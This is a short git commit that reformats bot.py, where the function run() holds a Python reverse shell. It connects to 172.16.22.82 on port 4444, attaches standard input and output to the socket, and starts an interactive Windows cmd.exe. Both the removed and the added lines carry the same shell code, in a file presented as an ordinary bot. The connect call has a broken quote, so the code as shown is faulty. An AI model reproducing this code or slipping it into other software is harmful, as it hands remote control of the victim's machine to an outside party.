a432983bb2eca032d35befab594598b41f89052c
Pol420OWO <118475266+Pol420OWO@users.noreply.github.com>
2023-02-14 19:28:09 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,2 +1,4 @@
 def run():
-   import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('172.16.22.82,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['C:\\WINDOWS\\system32\\cmd.exe','-i']);
+   import socket,subprocess,os;
+   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+   s.connect(('172.16.22.82,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['C:\\WINDOWS\\system32\\cmd.exe','-i']);
